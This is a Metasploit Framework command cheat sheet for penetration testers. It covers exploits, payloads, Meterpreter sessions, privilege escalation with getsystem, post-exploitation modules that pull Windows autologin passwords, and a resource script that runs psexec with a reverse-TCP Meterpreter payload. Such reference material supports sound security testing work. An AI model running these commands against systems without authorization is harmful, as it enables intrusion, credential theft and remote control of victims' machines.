# Metasploit Framework (MSF)

> The world’s most used penetration testing framework  
[Metasploit](https://www.metasploit.com)

## Start

Start db
```bash
msfdb start
```
or
```bash
systemctl start postgresql
```

Start metasploit framework console
```bash
msfconsole
```

## Exploits

Select exploit
```bash
use <exploit>
```

Run exploit
```bash
run
```
or
```bash
exploit
```

## Options

Show options
```bash
show options
```

Show advanced options
```bash
show advanced
```

Set option
```bash
set <option> <value>
```

Set option (global)
```bash
setg <option> <value>
```

## Payloads

Show payloads
```bash
show payloads
```

Select payload
```bash
set payload <payload>
```

## Sessions

Show sessions
```bash
sessions -h
```

Interact with session
```bash
sessions -i 1
```

Send session to background
```bash
background
```

## Meterpreter

The **shell** command will present you with a standard shell on the target system.
```bash
shell
```

Metasploit has a Meterpreter script, **getsystem**, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system.
```bash
getsystem
```

## Encoders

Show encoders
```bash
show encoders
```

Select encoder
```bash
set encoder <encoder>
```

## Misc

Search for exploits
```bash
search <term>
```

Go back
```bash
back
```

Display help
```bash
help
```

Get info about current context?
```bash
info
```

```bash
show auxiliary
```

## Multi/handler

Just start listener
```bash
use exploit/multi/handler
```

## Post exploitation

This module suggests local meterpreter exploits that can be used.
```bash
use post/multi/recon/local_exploit_suggester
```

This module extracts the plain-text Windows user login password in Registry.
```bash
use post/windows/gather/credentials/windows_autologin
```

This module will login with the specified username/password and execute the supplied command as a hidden process.
```bash
use post/windows/manage/run_as
```

### Meterpreter session

Migrate to other (e.g. more stable) process
```bash
migrate
```

Get system info
```bash
sysinfo
```

Port forwarding
```bash
portfwd add -l <port> -r 127.0.0.1 -p <port>
```

## Resource Scripts

Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit.
```bash
msfconsole -r demo.rc
```

### demo.rc

```
use exploit/windows/smb/psexec
set rhost <ip>
set smbuser Administrator
set smbpass <hash-or-password>
set smbdomain <domain>
set payload windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/smart_migrate
setg lport 443
setg lhost <own-ip>
```
